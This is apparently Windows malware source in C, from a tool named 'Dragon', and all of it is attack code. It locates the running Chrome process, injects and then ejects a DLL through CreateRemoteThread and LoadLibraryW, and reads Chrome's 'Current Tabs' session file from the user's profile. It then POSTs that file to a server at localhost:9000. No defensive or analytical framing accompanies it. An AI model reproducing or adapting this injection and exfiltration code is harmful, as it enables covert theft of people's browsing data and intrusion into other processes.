
#include "Dragon.h"
#include <tlhelp32.h>
#include <wininet.h>
#include <stdio.h>
#include <Shlobj.h>

DWORD getProcessId(LPCWSTR strProcessName)
{
	//! Get process id by given name.

	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	
	if( hProcessSnapshot == INVALID_HANDLE_VALUE )
	{
		return -1;
	}

	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof( PROCESSENTRY32 );

	if(!Process32First( hProcessSnapshot, &pe32 ))
	{
		CloseHandle( hProcessSnapshot );          // clean the snapshot object
		return -1;
	}

	DWORD dwProcessId = -1;
	do
	{
		if(!lstrcmp(strProcessName, pe32.szExeFile))
		{
			dwProcessId = pe32.th32ProcessID;
			break;
		}
			
	}
	while(Process32Next(hProcessSnapshot, &pe32));

	CloseHandle(hProcessSnapshot);
	return dwProcessId;
}

DWORD inject_library(DWORD dwProcessId, LPCWSTR lpcwsDllPath)
{
	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE,
		dwProcessId);

	if(hProcess == NULL)
	{
		return -1;
	}

	DWORD dwBufSize = (lstrlen(lpcwsDllPath) + 1)*sizeof(WCHAR);
	LPWSTR lpszRemoteBuf = (LPWSTR) VirtualAllocEx(
		hProcess,
		NULL,
		dwBufSize,
		MEM_COMMIT,
		PAGE_READWRITE);

	if(lpszRemoteBuf == NULL)
	{
		return -1;
	}

	DWORD dwWrittenBytes = 0;
	if(!WriteProcessMemory(
		hProcess,
		lpszRemoteBuf,
		lpcwsDllPath,
		dwBufSize,
		&dwWrittenBytes))
	{
		return -1;
	}

	LPTHREAD_START_ROUTINE load_library = (LPTHREAD_START_ROUTINE)GetProcAddress(
		GetModuleHandle(L"kernel32"),
		"LoadLibraryW");
	if(load_library == NULL)
	{
		return -1;
	}

	DWORD dwremoteThreadId = 0;
	HANDLE hRemoteThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		load_library,
		lpszRemoteBuf,
		0,
		&dwremoteThreadId);
	if(hRemoteThread == NULL)
	{
		return -1;
	}

	WaitForSingleObject(hRemoteThread, 100);
	VirtualFreeEx(
		hProcess,
		lpszRemoteBuf,
		0,
		MEM_RELEASE);
	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);

	return 0;
}

DWORD eject_library(DWORD dwProcessId,LPCWSTR lpcwsDllPath)
{
	HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
	if (hProcessSnapshot == NULL)
	{
		return -1;
	}

	BOOL bModuleFound = FALSE;
	MODULEENTRY32 module_entry = {sizeof(module_entry)};
	for(BOOL bModule = Module32First(hProcessSnapshot, &module_entry);
		bModule;
		bModule = Module32Next(hProcessSnapshot, &module_entry))
	{
		if(!lstrcmpi(module_entry.szModule, lpcwsDllPath) ||
			!lstrcmpi(module_entry.szExePath, lpcwsDllPath))
		{
			bModuleFound = TRUE;
			break;
		}
	}

	if(!bModuleFound)
	{
		return -1;
	}

	HANDLE hProcess = OpenProcess(
		PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION,
		FALSE,
		dwProcessId);
	if(hProcess == NULL)
	{
		return -1;
	}

	PTHREAD_START_ROUTINE free_library = (PTHREAD_START_ROUTINE)GetProcAddress(
		GetModuleHandle(L"Kernel32"),
		"FreeLibrary");
	if(free_library == NULL)
	{
		return -1;
	}

	HANDLE hRemoteThread = CreateRemoteThread(
		hProcess,
		NULL, 0,
		free_library,
		module_entry.modBaseAddr,
		0, NULL);
	if( hRemoteThread == NULL )
	{
		return -1;
	}

	WaitForSingleObject(hRemoteThread, 100);
	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
	CloseHandle(hProcessSnapshot);
	return 0;
}

DWORD sendFileToServer(LPCWSTR lpcsFilePath)
{
	HINTERNET hInternet = InternetOpen(
		L"Dragon",
		INTERNET_OPEN_TYPE_DIRECT,
		NULL,NULL,0);

	if(hInternet == NULL)
	{
		DWORD error = GetLastError();
		return -1;
	}

	HINTERNET hInternetConnection = InternetConnect(
		hInternet,
		L"localhost",
		9000,
		NULL,NULL,
		INTERNET_SERVICE_HTTP,
		0, NULL);
	if(hInternetConnection == NULL)
	{
		DWORD error = GetLastError();
		return -1;
	}

	HINTERNET hHttpRequest = HttpOpenRequest(
		hInternetConnection,
		L"POST",
		L"/data",
		NULL, NULL, NULL, 0, NULL);
	if(hHttpRequest == NULL)
	{
		DWORD error = GetLastError();
		return -1;
	}

	HANDLE hFile = CreateFile(
		lpcsFilePath,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		DWORD error = GetLastError();
		printf("Error %d", error);
	}

	BOOL bRes = FALSE;
	const DWORD dwBufLen = 4096;
	LPVOID lpBuf[dwBufLen];
	DWORD dwReadedBytes;
	bRes = ReadFile(
		(HANDLE)hFile,
		lpBuf,
		dwBufLen,
		&dwReadedBytes,
		NULL);
	if(!bRes)
	{
		DWORD error = GetLastError();
	}

	bRes = HttpSendRequest(
		hHttpRequest,
		NULL, 0,
		lpBuf,
		dwReadedBytes);
	if(!bRes)
	{
		DWORD error = GetLastError();
	}

	CloseHandle((HANDLE)hFile);
	InternetCloseHandle(hHttpRequest);
	InternetCloseHandle(hInternetConnection);
	InternetCloseHandle(hInternet);
}

void sendChromeCurrentTabs(void)
{
   DWORD chromId = getProcessId(L"chrome.exe");
   if(chromId != -1)
   {
	   inject_library(chromId, L"awl.dll");
	   eject_library(chromId,L"awl.dll");
   }
   
	WCHAR lpwsPath[MAX_PATH] = {0};
	if(SUCCEEDED(SHGetFolderPath(NULL, 
								 CSIDL_LOCAL_APPDATA, 
								 NULL, 
								 0, 
								 lpwsPath))) 
	{
		if(chromId != -1)
			lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs D");
		else
			lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs");
		sendFileToServer(lpwsPath);
	}
}